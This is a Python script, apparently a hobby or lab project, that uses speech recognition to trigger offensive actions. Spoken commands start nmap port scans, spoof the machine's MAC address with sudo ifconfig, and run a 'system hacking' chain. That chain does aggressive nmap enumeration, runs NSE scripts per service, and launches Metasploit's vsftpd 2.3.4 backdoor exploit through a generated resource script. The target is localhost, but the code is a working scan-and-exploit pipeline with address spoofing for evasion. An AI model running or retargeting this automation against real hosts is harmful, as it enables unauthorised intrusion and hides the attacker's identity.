
import pyttsx3
import subprocess
import speech_recognition as sr
import random

# Text-to-speech initialization
engine = pyttsx3.init()

# Initialize recognizer
r = sr.Recognizer()

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0x00, 0xFF) for _ in range(6))

with sr.Microphone() as source:
    print("Talk")
    audio_text = r.listen(source)
    print("Time over, thanks")

    try:
        final = r.recognize_google(audio_text)
        print("Text: " + final)
        final = final.lower()

        if "start scanning" in final:
            engine.say("Starting network scan")
            engine.runAndWait()
            subprocess.run(['nmap', '127.0.0.1', '-p-'])

        elif "mac change" in final:
            engine.say("Changing MAC address")
            engine.runAndWait()
            interface = "eth0"  # Change to your actual interface
            new_mac = random_mac()

            subprocess.run(['sudo', 'ifconfig', interface, 'down'])
            subprocess.run(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac])
            subprocess.run(['sudo', 'ifconfig', interface, 'up'])
            print(f"MAC address changed to {new_mac}")

        elif "system hacking" in final:
            engine.say("Starting full network enumeration and exploitation")
            engine.runAndWait()

            # Step 1: Nmap Aggressive Scan
            print("[*] Running full Nmap scan...")
            subprocess.run([
                'nmap', '-A', '-T4', '127.0.0.1', '-oN', 'nmap_full_scan.txt'
            ])

            # Step 2: Parse scan result to identify services
            services = []
            with open('nmap_full_scan.txt', 'r') as f:
                lines = f.readlines()
            for line in lines:
                if "/tcp" in line and "open" in line:
                    print("[+] Open Port Line:", line.strip())
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        service = parts[2]
                        services.append(service)

            # Step 3: Run NSE script scan based on each service
            for service in services:
                print(f"[+] Running NSE script scan for: {service}")
                try:
                    subprocess.run([
                        'nmap', '--script', f'{service}-*', '127.0.0.1'
                    ])
                except Exception as e:
                    print(f"[-] Error scanning with script for {service}: {e}")

            # Step 4: Exploit using Metasploit (example: vsftpd 2.3.4 backdoor)
            engine.say("Launching Metasploit for exploitation")
            engine.runAndWait()

            msf_script = '''
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 127.0.0.1
set RPORT 21
exploit
'''
            with open("exploit.rc", "w") as f:
                f.write(msf_script)

            subprocess.run(['msfconsole', '-r', 'exploit.rc'])

    except sr.UnknownValueError:
        print("Could not understand audio")
    except sr.RequestError as e:
        print(f"Could not request results; {e}")

